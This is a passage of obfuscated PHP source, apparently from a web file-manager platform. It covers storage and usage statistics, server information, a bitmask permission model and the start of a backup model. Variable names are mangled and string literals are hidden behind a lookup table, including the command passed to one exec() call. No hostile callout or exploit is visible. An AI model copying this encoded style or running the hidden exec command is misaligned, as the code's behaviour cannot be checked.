Model($õÛœÂ®÷[555])->where($íêóøí²)->sum($õÛœÂ®÷[79]); $íêóøí²[$õÛœÂ®÷[496]] = 0; $ô¼¤€Ú  = Model($õÛœÂ®÷[901])->where($íêóøí²)->sum($õÛœÂ®÷[79]); $íêóøí²[$õÛœÂ®÷[190]] = 1; $‰ÖÓé›Ø = Model($õÛœÂ®÷[901])->where($íêóøí²)->sum($õÛœÂ®÷[79]); $íêóøí²[$õÛœÂ®÷[190]] = 2; $è²•Çá = Model($õÛœÂ®÷[901])->where($íêóøí²)->sum($õÛœÂ®÷[79]); $·çìä = array($õÛœÂ®÷[284] => $Ã¦°æİ¨, $õÛœÂ®÷[839] => (int) $ô¼¤€Ú , $õÛœÂ®÷[1907] => (int) $’Ñ¬‹•, $õÛœÂ®÷[1908] => (int) $‰ÖÓé›Ø, $õÛœÂ®÷[1909] => (int) $è²•Çá); return $this->insert($·çìä); } public function trend($±ä”ôâ–, $á‹½âûš) { $‰©êŸãÂ =& $_SERVER[´È¥ö†ö]; if (!$this->init($±ä”ôâ–)) { return !1; } $š¿Êü÷ê = $this->trendList($±ä”ôâ–); if ($š¿Êü÷ê && $á‹½âûš != $‰©êŸãÂ[1745]) { $Æ‰Ç²Ñ = $š¿Êü÷ê[0][$‰©êŸãÂ[284]]; $ö‹Äô©Ë = $this->validDate($á‹½âûš, $Æ‰Ç²Ñ); $˜Í¶¬– = array(); $ùçúñğ = array_to_keyvalue($š¿Êü÷ê, $‰©êŸãÂ[284]); foreach ($ö‹Äô©Ë as $ƒÙÌ²…„) { if (isset($ùçúñğ[$ƒÙÌ²…„])) { $Óğ±¦¤¼ = $ùçúñğ[$ƒÙÌ²…„]; } else { $Óğ±¦¤¼ = end($š¿Êü÷ê); $Óğ±¦¤¼[$‰©êŸãÂ[284]] = $ƒÙÌ²…„; if ($±ä”ôâ– == $‰©êŸãÂ[676]) { $Óğ±¦¤¼[$‰©êŸãÂ[1903]] = $Óğ±¦¤¼[$‰©êŸãÂ[1904]] = 0; } } $˜Í¶¬–[] = $Óğ±¦¤¼; } $š¿Êü÷ê = $˜Í¶¬–; } $Û®Ø³§á = array($‰©êŸãÂ[676] => array($‰©êŸãÂ[841] => LNG($‰©êŸãÂ[1919]), $‰©êŸãÂ[1903] => LNG($‰©êŸãÂ[1920]), $‰©êŸãÂ[1904] => LNG($‰©êŸãÂ[1921])), $‰©êŸãÂ[1905] => array($‰©êŸãÂ[839] => LNG($‰©êŸãÂ[1922]), $‰©êŸãÂ[1907] => LNG($‰©êŸãÂ[1923]), $‰©êŸãÂ[1908] => LNG($‰©êŸãÂ[1924]), $‰©êŸãÂ[1909] => LNG($‰©êŸãÂ[1925]))); $øĞùÛà’ = array($‰©êŸãÂ[676] => $‰©êŸãÂ[1926], $‰©êŸãÂ[1905] => $‰©êŸãÂ[79]); if (empty($š¿Êü÷ê)) { $ƒÙÌ²…„ = date($‰©êŸãÂ[1910], strtotime($‰©êŸãÂ[1911])); $ÊÑñÕíÙ = array($‰©êŸãÂ[284] => $ƒÙÌ²…„); foreach ($Û®Ø³§á[$±ä”ôâ–] as $‘·³£™ı => $—ÆÖ‚õİ) { $ÊÑñÕíÙ[$‘·³£™ı] = 0; } $š¿Êü÷ê[] = $ÊÑñÕíÙ; } $ôıçíÎ = array(); foreach ($š¿Êü÷ê as $—ÆÖ‚õİ) { if ($±ä”ôâ– == $‰©êŸãÂ[1905] && $—ÆÖ‚õİ[$‰©êŸãÂ[1907]] > $—ÆÖ‚õİ[$‰©êŸãÂ[839]]) { $—ÆÖ‚õİ[$‰©êŸãÂ[1907]] = $—ÆÖ‚õİ[$‰©êŸãÂ[839]]; } foreach ($Û®Ø³§á[$±ä”ôâ–] as $‘·³£™ı => $·¦Œöë’) { $Óğ±¦¤¼ = array($‰©êŸãÂ[284] => $—ÆÖ‚õİ[$‰©êŸãÂ[284]], $‰©êŸãÂ[1659] => $·¦Œöë’); $Óğ±¦¤¼[$øĞùÛà’[$±ä”ôâ–]] = isset($—ÆÖ‚õİ[$‘·³£™ı]) ? $—ÆÖ‚õİ[$‘·³£™ı] : 0; $ôıçíÎ[] = $Óğ±¦¤¼; } } return $ôıçíÎ; } public function validDate($÷Ëò»­¼, $øØ»§¤) { $«·Ìâ°˜ =& $_SERVER[´È¥ö†ö]; $ÄŠôıÄæ = date($«·Ìâ°˜[1910], strtotime($«·Ìâ°˜[1911])); $‚š¸¥¦æ = array($ÄŠôıÄæ); switch ($÷Ëò»­¼) { case $«·Ìâ°˜[1752]: $õŞªÚıÚ = mktime(0, 0, 0, date($«·Ìâ°˜[1927]), date($«·Ìâ°˜[1451]) - date($«·Ìâ°˜[1541]) + 7 - 7, date($«·Ìâ°˜[1928])); $âÀÊ—Ë— = 0; do { $«èï®«‚ = date($«·Ìâ°˜[1910], $õŞªÚıÚ - 3600 * 24 * 7 * $âÀÊ—Ë—); $‚š¸¥¦æ[] = $«èï®«‚; $âÀÊ—Ë—++; } while ($øØ»§¤ < $«èï®«‚); break; case $«·Ìâ°˜[1750]: $âÀÊ—Ë— = 1; do { $õË­¹‰¯ = date($«·Ìâ°˜[1929], strtotime("\x2d\x20{$âÀÊ—Ë—}\40\155\x6f\156\164\150\163")); $‚š¸¥¦æ[] = $õË­¹‰¯; $âÀÊ—Ë—++; } while ($øØ»§¤ < $õË­¹‰¯); break; case $«·Ìâ°˜[1930]: $±Ú·°« = (int) date($«·Ìâ°˜[1928], strtotime($øØ»§¤)); $˜†ıîÕ = (int) date($«·Ìâ°˜[1928]); if ($±Ú·°« >= $˜†ıîÕ) { break; } for ($±Ú·°«; $±Ú·°« < $˜†ıîÕ; $±Ú·°«++) { $‚š¸¥¦æ[] = $±Ú·°« . $«·Ìâ°˜[1931]; } break; default: break; } if ($øØ»§¤ > end($‚š¸¥¦æ)) { array_pop($‚š¸¥¦æ); } sort($‚š¸¥¦æ); return $‚š¸¥¦æ; } public function listTable($àÚ‚¤„Ü) { $ÊÙ¤…Ô = ucfirst($àÚ‚¤„Ü); return Model($ÊÙ¤…Ô)->listData(); } public function option($ºÉÅ‰à) { $Ü¡Ä²ç = $_SERVER[´È¥ö†ö][1932] . ucfirst($ºÉÅ‰à); return $this->{$Ü¡Ä²ç}(); } private function optionUser() { $ò€òÎÆï =& $_SERVER[´È¥ö†ö]; $½¾¿ƒú™ = Model($ò€òÎÆï[608])->count($ò€òÎÆï[1773]); $›ë½©·˜ = Model($ò€òÎÆï[608])->where($ò€òÎÆï[1933])->count($ò€òÎÆï[1773]); $ì¹ÆŸû“ = intval($GLOBALS[$ò€òÎÆï[6]][$ò€òÎÆï[435]][$ò€òÎÆï[1718]]) / 3600; $ÜÑ¶İ Œ = strtotime("\x2d{$ì¹ÆŸû“}\x20\x68\x6f\165\x72\163"); $„ÁŞåöâ = strtotime(date($ò€òÎÆï[1914])); if ($ÜÑ¶İ Œ < $„ÁŞåöâ) { $ÜÑ¶İ Œ = $„ÁŞåöâ; } $¢¨¯úˆ¹ = array($ò€òÎÆï[1934] => array($ò€òÎÆï[1090], $ÜÑ¶İ Œ)); $¤€–’ğÂ = (int) Model($ò€òÎÆï[608])->where($¢¨¯úˆ¹)->count($ò€òÎÆï[1773]); if (!$¤€–’ğÂ) { $¤€–’ğÂ = 1; } $¢¨¯úˆ¹ = array($ò€òÎÆï[1934] => array($ò€òÎÆï[1090], $„ÁŞåöâ)); $³ÖÒÅ¸¤ = Model($ò€òÎÆï[608])->where($¢¨¯úˆ¹)->count($ò€òÎÆï[1773]); return array($ò€òÎÆï[834] => (int) $½¾¿ƒú™, $ò€òÎÆï[1935] => (int) ($½¾¿ƒú™ - $›ë½©·˜), $ò€òÎÆï[1936] => (int) $›ë½©·˜, $ò€òÎÆï[1937] => (int) $³ÖÒÅ¸¤, $ò€òÎÆï[1938] => $¤€–’ğÂ); } private function optionFile() { $â¹Û«…† =& $_SERVER[´È¥ö†ö]; $ùŸ’è‘ï = $this->sourceSize(); $Ìµïç›Ú = $ùŸ’è‘ï[$â¹Û«…†[79]]; $Ü–ı¬ñ = $ùŸ’è‘ï[$â¹Û«…†[1907]]; $á÷¤å¤† = Model($â¹Û«…†[901])->where(array($â¹Û«…†[496] => 0))->count($â¹Û«…†[193]); $°ÛÉ‹Ï = array($â¹Û«…†[496] => 0, $â¹Û«…†[233] => array($â¹Û«…†[1090], strtotime(date($â¹Û«…†[1914])))); $ğç©µŒŠ = Model($â¹Û«…†[901])->where($°ÛÉ‹Ï)->sum($â¹Û«…†[79]); $³úéÀœ = Model($â¹Û«…†[901])->where($°ÛÉ‹Ï)->count($â¹Û«…†[193]); return array($â¹Û«…†[839] => $Ìµïç›Ú, $â¹Û«…†[1907] => $Ü–ı¬ñ, $â¹Û«…†[1939] => $Ìµïç›Ú - $Ü–ı¬ñ, $â¹Û«…†[1940] => (int) $ğç©µŒŠ, $â¹Û«…†[841] => (int) $á÷¤å¤†, $â¹Û«…†[1941] => (int) $³úéÀœ); } private function optionAccess() { $şó¯¢ =& $_SERVER[´È¥ö†ö]; return array($şó¯¢[834] => $this->typeLogCnt(), $şó¯¢[110] => $this->typeLogCnt($şó¯¢[110]), $şó¯¢[536] => $this->typeLogCnt($şó¯¢[536]), $şó¯¢[1942] => $this->typeLogCnt($şó¯¢[1942]), $şó¯¢[1943] => $this->typeLogCnt($şó¯¢[1943]), $şó¯¢[676] => $this->typeLogCnt($şó¯¢[12], $şó¯¢[1918])); } private function typeLogCnt($Ğûş¿Ä = '', $‡Òã‹ÆÌ = "\x69\x64") { $ÒÛÅæá =& $_SERVER[´È¥ö†ö]; $ŒªÓÜåà = array($ÒÛÅæá[110] => array($ÒÛÅæá[1944], $ÒÛÅæá[1945]), $ÒÛÅæá[536] => array($ÒÛÅæá[1946], $ÒÛÅæá[1947]), $ÒÛÅæá[1942] => array($ÒÛÅæá[1948], $ÒÛÅæá[1949], $ÒÛÅæá[1950]), $ÒÛÅæá[1943] => array($ÒÛÅæá[1951], $ÒÛÅæá[1952]), $ÒÛÅæá[1953] => array($ÒÛÅæá[1954], $ÒÛÅæá[1955], $ÒÛÅæá[1956])); $»ÔÍ«œ’ = strtotime(date($ÒÛÅæá[1914])); $§»Ô«°ã = array($ÒÛÅæá[233] => array($ÒÛÅæá[1090], $»ÔÍ«œ’)); if ($Ğûş¿Ä) { $§»Ô«°ã[$ÒÛÅæá[33]] = array($ÒÛÅæá[7], $ŒªÓÜåà[$Ğûş¿Ä]); } $ÖøŞÏşº = Model($ÒÛÅæá[1917])->where($§»Ô«°ã)->count($‡Òã‹ÆÌ); return (int) $ÖøŞÏşº; } private function optionServer() { $ûğõ­ÀÇ =& $_SERVER[´È¥ö†ö]; $µÓ¯Ğ„Ã = $this->diskDriver(); $‘Šú¿î = KodIO::defaultDriver(); $²Ë¡ú÷ = array($ûğõ­ÀÇ[894] => $‘Šú¿î[$ûğõ­ÀÇ[486]]); $”´Ø™œ¯ = Model($ûğõ­ÀÇ[555])->where($²Ë¡ú÷)->sum($ûğõ­ÀÇ[79]); $“ æßÅ– = explode($ûğõ­ÀÇ[53], $_SERVER[$ûğõ­ÀÇ[147]]); $Íºä¨üÅ = $“ æßÅ–[0]; $‹‹µæ›Ø = $GLOBALS[$ûğõ­ÀÇ[6]][$ûğõ­ÀÇ[21]]; $…‡Ûêê = $‹‹µæ›Ø[$ûğõ­ÀÇ[1052]]; if ($…‡Ûêê == $ûğõ­ÀÇ[1040]) { $îğ†œÒè = explode($ûğõ­ÀÇ[1367], $‹‹µæ›Ø[$ûğõ­ÀÇ[1051]]); $…‡Ûêê = $îğ†œÒè[0]; } if ($…‡Ûêê == $ûğõ­ÀÇ[988] || $…‡Ûêê == $ûğõ­ÀÇ[881]) { $êó©Ë = Model()->db()->query($ûğõ­ÀÇ[1957]); $øä¦Ãà› = $êó©Ë[0] && isset($êó©Ë[0][$ûğõ­ÀÇ[1658]]) ? $êó©Ë[0][$ûğõ­ÀÇ[1658]] : 0; $…‡Ûêê = $ûğõ­ÀÇ[1958] . ($øä¦Ãà› ? $ûğõ­ÀÇ[8] . $øä¦Ãà› : $ûğõ­ÀÇ[12]); } $Ğ×âÒ¶˜ = $GLOBALS[$ûğõ­ÀÇ[6]][$ûğõ­ÀÇ[435]][$ûğõ­ÀÇ[903]]; return array($ûğõ­ÀÇ[1959] => $µÓ¯Ğ„Ã ? $µÓ¯Ğ„Ã[$ûğõ­ÀÇ[1960]] : 0, $ûğõ­ÀÇ[1961] => $µÓ¯Ğ„Ã ? $µÓ¯Ğ„Ã[$ûğõ­ÀÇ[1962]] : 0, $ûğõ­ÀÇ[1963] => (int) $‘Šú¿î[$ûğõ­ÀÇ[1960]] * 1024 * 1024 * 1024, $ûğõ­ÀÇ[1964] => (int) $”´Ø™œ¯, $ûğõ­ÀÇ[1965] => ucfirst($Íºä¨üÅ), $ûğõ­ÀÇ[1966] => $ûğõ­ÀÇ[1967] . PHP_VERSION, $ûğõ­ÀÇ[1968] => phpBuild64() ? 64 : 32, $ûğõ­ÀÇ[833] => str_replace($ûğõ­ÀÇ[1208], $ûğõ­ÀÇ[1068], $…‡Ûêê), $ûğõ­ÀÇ[435] => ucfirst($Ğ×âÒ¶˜), $ûğõ­ÀÇ[32] => $_SERVER[$ûğõ­ÀÇ[1969]]); } private function diskDriver() { $¦İ¼¸ã½ =& $_SERVER[´È¥ö†ö]; $îê¼ûÎ— = $¦İ¼¸ã½[8]; $àƒş¨– = $GLOBALS[$¦İ¼¸ã½[6]][$¦İ¼¸ã½[1384]] == $¦İ¼¸ã½[1385]; if ($àƒş¨–) { $îê¼ûÎ— = $¦İ¼¸ã½[1970]; if (function_exists($¦İ¼¸ã½[1971])) { exec($¦İ¼¸ã½[1972], $Ä·«Í); $îê¼ûÎ— = $Ä·«Í[1] . $¦İ¼¸ã½[8]; } } if (!file_exists($îê¼ûÎ—)) { return; } if (!function_exists($¦İ¼¸ã½[1973])) { return; } $¢Œ¹Ğ¦¦ = @disk_total_space($îê¼ûÎ—); $ÙœÕ–Ğ¼ = $¢Œ¹Ğ¦¦ - @disk_free_space($îê¼ûÎ—); return array($¦İ¼¸ã½[1960] => $¢Œ¹Ğ¦¦, $¦İ¼¸ã½[1962] => $ÙœÕ–Ğ¼); } public function fileChart($¼‰Û…™Î) { $÷Óá¦şÔ =& $_SERVER[´È¥ö†ö]; if (isset($¼‰Û…™Î[$÷Óá¦şÔ[1773]])) { return Model($÷Óá¦şÔ[901])->userFileTypeProfile($¼‰Û…™Î[$÷Óá¦şÔ[1773]]); } if (isset($¼‰Û…™Î[$÷Óá¦şÔ[1974]])) { return Model($÷Óá¦şÔ[901])->groupFileTypeProfile($¼‰Û…™Î[$÷Óá¦şÔ[1974]]); } $¾ˆæ„ªò = $this->sourceSize(); $ëÉ÷ßôÓ = array($÷Óá¦şÔ[192] => 0, $÷Óá¦şÔ[190] => 1); $Éíô¢‹ş = Model($÷Óá¦şÔ[901])->where($ëÉ÷ßôÓ)->sum($÷Óá¦şÔ[79]); $ëÉ÷ßôÓ[$÷Óá¦şÔ[190]] = 2; $üù‚Áğ = Model($÷Óá¦şÔ[901])->where($ëÉ÷ßôÓ)->sum($÷Óá¦şÔ[79]); return array($÷Óá¦şÔ[839] => $¾ˆæ„ªò[$÷Óá¦şÔ[79]], $÷Óá¦şÔ[1907] => $¾ˆæ„ªò[$÷Óá¦şÔ[1907]], $÷Óá¦şÔ[1908] => (int) $Éíô¢‹ş, $÷Óá¦şÔ[1909] => (int) $üù‚Áğ); } private function sourceSize() { $¾êöƒˆ¸ =& $_SERVER[´È¥ö†ö]; $Ó¼ªÜÂ = Model($¾êöƒˆ¸[901])->where(array($¾êöƒˆ¸[496] => 0))->sum($¾êöƒˆ¸[79]); $¶³°Ò†§ = Model($¾êöƒˆ¸[555])->sum($¾êöƒˆ¸[79]); if ($¶³°Ò†§ > $Ó¼ªÜÂ) { $¶³°Ò†§ = $Ó¼ªÜÂ; } return array($¾êöƒˆ¸[79] => (int) $Ó¼ªÜÂ, $¾êöƒˆ¸[1907] => (int) $¶³°Ò†§); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¨Ã´…í =& $_SERVER[´È¥ö†ö]; $òãû©œô = array(array($¨Ã´…í[505] => LNG($¨Ã´…í[1975]), $¨Ã´…í[1976] => $¨Ã´…í[1977], $¨Ã´…í[1978] => 1, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨Ã´…í[505] => LNG($¨Ã´…í[1981]), $¨Ã´…í[1976] => $¨Ã´…í[1982], $¨Ã´…í[1978] => 2, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨Ã´…í[505] => LNG($¨Ã´…í[1983]), $¨Ã´…í[1976] => $¨Ã´…í[1984], $¨Ã´…í[1978] => 3, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¨Ã´…í[505] => LNG($¨Ã´…í[1985]), $¨Ã´…í[1976] => $¨Ã´…í[1986], $¨Ã´…í[1978] => 4, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_VIEW), array($¨Ã´…í[505] => LNG($¨Ã´…í[1987]), $¨Ã´…í[1976] => $¨Ã´…í[1988], $¨Ã´…í[1978] => 5, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¨Ã´…í[505] => LNG($¨Ã´…í[1989]), $¨Ã´…í[1976] => $¨Ã´…í[1990], $¨Ã´…í[1978] => 6, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¨Ã´…í[505] => LNG($¨Ã´…í[1991]), $¨Ã´…í[1976] => $¨Ã´…í[1992], $¨Ã´…í[1978] => 7, $¨Ã´…í[1979] => 1, $¨Ã´…í[1980] => 0)); return $òãû©œô; } public static function authCheck($ä­†¥äİ, $¾›Ó««¨) { $™õÓ†ß¡ =& $_SERVER[´È¥ö†ö]; $ä­†¥äİ = intval($ä­†¥äİ); if (KodUser::isRoot() && $GLOBALS[$™õÓ†ß¡[6]][$™õÓ†ß¡[1993]]) { return !0; } if ($ä­†¥äİ <= 0) { return !1; } if (($ä­†¥äİ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ä­†¥äİ & $¾›Ó««¨); } public static function authCheckShow($Áœ¿é±£) { return self::authCheck($Áœ¿é±£, self::AUTH_SHOW); } public static function authCheckView($·€ñ´×ú) { return self::authCheck($·€ñ´×ú, self::AUTH_VIEW); } public static function authCheckDownload($Ğ¥¾÷ò) { return self::authCheck($Ğ¥¾÷ò, self::AUTH_DOWNLOAD); } public static function authCheckUpload($õÏ”ãÌ‰) { return self::authCheck($õÏ”ãÌ‰, self::AUTH_UPLOAD); } public static function authCheckEdit($½‚¯•ÚÚ) { return self::authCheck($½‚¯•ÚÚ, self::AUTH_EDIT); } public static function authCheckRemove($ˆÚŠ–¾Á) { return self::authCheck($ˆÚŠ–¾Á, self::AUTH_REMOVE); } public static function authCheckShare($ß·øîÒ¥) { return self::authCheck($ß·øîÒ¥, self::AUTH_SHARE); } public static function authCheckComment($è­¦æéœ) { return self::authCheck($è­¦æéœ, self::AUTH_COMMENT); } public static function authCheckEvent($•‰õÜË¶) { return self::authCheck($•‰õÜË¶, self::AUTH_EVENT); } public static function authCheckRoot($®É¦´º¤) { return self::authCheck($®É¦´º¤, self::AUTH_ROOT); } public static function authCheckAction($ë¾”¾ª, $°ŠÁ¦ÖÊ) { $è‡ÍˆÀÂ =& $_SERVER[´È¥ö†ö]; $“ææ‹±‘ = array($è‡ÍˆÀÂ[1994] => self::AUTH_VIEW, $è‡ÍˆÀÂ[1278] => self::AUTH_DOWNLOAD, $è‡ÍˆÀÂ[110] => self::AUTH_UPLOAD, $è‡ÍˆÀÂ[1943] => self::AUTH_EDIT, $è‡ÍˆÀÂ[1942] => self::AUTH_REMOVE, $è‡ÍˆÀÂ[1953] => self::AUTH_SHARE, $è‡ÍˆÀÂ[440] => self::AUTH_COMMENT, $è‡ÍˆÀÂ[1760] => self::AUTH_EVENT, $è‡ÍˆÀÂ[1995] => self::AUTH_ROOT); if (!isset($“ææ‹±‘[$°ŠÁ¦ÖÊ])) { return; } $ÂÑŸ¯àÙ = $“ææ‹±‘[$°ŠÁ¦ÖÊ]; $ë¾”¾ª = intval($ë¾”¾ª); if ($ë¾”¾ª <= 0) { return !1; } if (($ë¾”¾ª & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ë¾”¾ª & $ÂÑŸ¯àÙ); } public static function authDisable($±½›èµ’, $Å¹¨„Êí) { if (intval($±½›èµ’) <= 0) { return 0; } return intval($±½›èµ’) & ~$Å¹¨„Êí; } public $optionType = "\x53\171\x73\x74\x65\x6d\56\x73\157\x75\x72\x63\145\x41\x75\164\x68\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\141\x75\164\x68", "\x6c\x61\142\145\154", "\x64\151\163\160\154\141\x79", "\x73\171\163\164\145\155", "\163\157\x72\164"); public function initData() { $‘ä°¥ƒœ = $this->authDefault(); foreach ($‘ä°¥ƒœ as $¾î‡ÁŞ) { $this->add($¾î‡ÁŞ); } } public function findAuth($í“‚ÃÅî, $„¸ÉÇ¦ï) { $Åø…¤’É =& $_SERVER[´È¥ö†ö]; $ö¢ğ‚ßè = parent::listData(); foreach ($ö¢ğ‚ßè as $Éş³‘»¶) { $‡Ì·Æ” = intval($Éş³‘»¶[$Åø…¤’É[498]]); if ($‡Ì·Æ” <= 0 || $Éş³‘»¶[$Åø…¤’É[1996]] == 0) { continue; } if (($‡Ì·Æ” & $í“‚ÃÅî) != $í“‚ÃÅî) { continue; } if (($‡Ì·Æ” & $„¸ÉÇ¦ï) != 0) { continue; } return $Éş³‘»¶[$Åø…¤’É[486]]; } return !1; } public function findAuthMax($Ø¸ïÇ«Ì, $ÛÛ·§) { $àêÆŞ…ì =& $_SERVER[´È¥ö†ö]; $ŒÖ‰³¾ô = !1; $ÁÊØûäè = parent::listData(); foreach ($ÁÊØûäè as $•ÌÕ•ÍÑ) { $ÏÒ–³°Â = intval($•ÌÕ•ÍÑ[$àêÆŞ…ì[498]]); if ($ÏÒ–³°Â <= 0 || $•ÌÕ•ÍÑ[$àêÆŞ…ì[1996]] == 0) { continue; } if (($ÏÒ–³°Â & $Ø¸ïÇ«Ì) != $Ø¸ïÇ«Ì) { continue; } if (($ÏÒ–³°Â & $ÛÛ·§) != 0) { continue; } if (!$ŒÖ‰³¾ô) { $ŒÖ‰³¾ô = $•ÌÕ•ÍÑ; continue; } if (intval($ŒÖ‰³¾ô[$àêÆŞ…ì[498]]) < $ÏÒ–³°Â) { $ŒÖ‰³¾ô = $•ÌÕ•ÍÑ; } } return $ŒÖ‰³¾ô ? $ŒÖ‰³¾ô[$àêÆŞ…ì[486]] : !1; } public function findAuthReadOnly() { $˜º®‚œ” = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÏŒ»îø× = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($˜º®‚œ”, $ÏŒ»îø×); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $æĞÂ¬²ö =& $_SERVER[´È¥ö†ö]; $ş‰£Û‹Œ = parent::listData(); $âÇ¦ã… = !1; foreach ($ş‰£Û‹Œ as $åæò¢Ìõ) { if ($åæò¢Ìõ[$æĞÂ¬²ö[498]] <= 0 || $åæò¢Ìõ[$æĞÂ¬²ö[1996]] == $æĞÂ¬²ö[230]) { continue; } if (!$âÇ¦ã…) { $âÇ¦ã… = $åæò¢Ìõ; continue; } if ($âÇ¦ã…[$æĞÂ¬²ö[498]] > $åæò¢Ìõ[$æĞÂ¬²ö[498]]) { $âÇ¦ã… = $åæò¢Ìõ; } } return $âÇ¦ã… ? $âÇ¦ã…[$æĞÂ¬²ö[486]] : $æĞÂ¬²ö[12]; } public function listData($Û— óí = false, $êÁ¾Ğ = "\163\x6f\x72\x74", $ñõÄçàó = false) { return parent::listData($Û— óí, $êÁ¾Ğ, $ñõÄçàó); } public function update($Ôƒèê³ë, $ü²”°Ú‰) { $œïŒÃÑî =& $_SERVER[´È¥ö†ö]; $Ğ •ŒÁ» = parent::listData($Ôƒèê³ë); $í…‹¶Â = $this->findByName($ü²”°Ú‰[$œïŒÃÑî[32]]); if (!$Ğ •ŒÁ» || $í…‹¶Â && $í…‹¶Â[$œïŒÃÑî[486]] != $Ğ •ŒÁ»[$œïŒÃÑî[486]]) { return !1; } $this->filterAuth($ü²”°Ú‰[$œïŒÃÑî[498]]); return parent::update($Ôƒèê³ë, $ü²”°Ú‰); } public function remove($ã°ñ’‹Š) { $Ó¼ù¶’“ = parent::listData($ã°ñ’‹Š); if (!$Ó¼ù¶’“ || $Ó¼ù¶’“[$_SERVER[´È¥ö†ö][191]]) { return !1; } return parent::remove($ã°ñ’‹Š); } public function add($İÃ­ïä = array()) { $®æáÛßı =& $_SERVER[´È¥ö†ö]; if ($this->findByName($İÃ­ïä[$®æáÛßı[32]])) { return !1; } $™ª¯Úå = array($®æáÛßı[32] => $®æáÛßı[12], $®æáÛßı[498] => 1, $®æáÛßı[1997] => $®æáÛßı[1984], $®æáÛßı[1996] => 1, $®æáÛßı[191] => 0, $®æáÛßı[1998] => 0); $İÃ­ïä = array_merge($™ª¯Úå, $İÃ­ïä); $İÃ­ïä[$®æáÛßı[1998]] = $this->getSort(); $this->filterAuth($İÃ­ïä[$®æáÛßı[498]]); return parent::insert($İÃ­ïä); } private function getSort() { $÷å©éãî =& $_SERVER[´È¥ö†ö]; $ôîÛüËî = parent::listData(); $ĞÎ¨€‚ = array_to_keyvalue($ôîÛüËî, $÷å©éãî[12], $÷å©éãî[1998]); return empty($ĞÎ¨€‚) ? 0 : max($ĞÎ¨€‚) + 1; } private function filterAuth(&$ş‰ß“Ö) { if (!$ş‰ß“Ö) { return; } $È®´Ï¿ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $‹· åÓı = array(); foreach ($È®´Ï¿ as $šÈë‡Üç) { if ($ş‰ß“Ö & $šÈë‡Üç) { $‹· åÓı[] = $šÈë‡Üç; } } if (in_array(self::AUTH_ROOT, $‹· åÓı)) { $ş‰ß“Ö = array_sum($È®´Ï¿); return; } $—öå«‰õ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($‹· åÓı as $šÈë‡Üç) { if (isset($—öå«‰õ[$šÈë‡Üç])) { $‹· åÓı = array_merge($‹· åÓı, $—öå«‰õ[$šÈë‡Üç]); } } $‹· åÓı[] = self::AUTH_SHOW; $ş‰ß“Ö = array_sum(array_unique($‹· åÓı)); } public function sort($’·Çõª, $Á¶“•Ââ) { return parent::update($’·Çõª, $Á¶“•Ââ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\x62\x61\143\153\x75\160\114\x69\x73\164"; public $field = array("\x69\157", "\x6e\x61\x6d\145", "\163\x74\x61\164\165\x73", "\143\x6f\156\164\x65\156\x74", "\155\x61\156\x75\x61\x6c", "\162\x65\x73\165\x6c\x74", "\164\151\155\x65\106\x72\157\x6d", "\164\x69\155\145\124\x6f"); public function config() { $·‰«•¡Î =& $_SERVER[´È¥ö†ö]; Action($·‰«•¡Î[1999])->taskInit(); $ª‰Ì„ß = Model($·‰«•¡Î[846])->get($·‰«•¡Î[860]); $ª‰Ì„ß = json_decode($ª‰Ì„ß, !0); $ª‰Ì„ß = is_array($ª‰Ì„ß) ? $ª‰Ì„ß : array(); $this->parseContent($ª‰Ì„ß); unset($ª‰Ì„ß[$·‰«•¡Î[1742]]); Model($·‰«•¡Î[1741])->cacheClear(); $íµ°œŸ = $·‰«•¡Î[2000]; $¦²õíŠ¢ = Model($·‰«•¡Î[2001])->findByKey($·‰«•¡Î[1760], $íµ°œŸ); if (!$¦²õíŠ¢) { $¦²õíŠ¢ = array(); } if 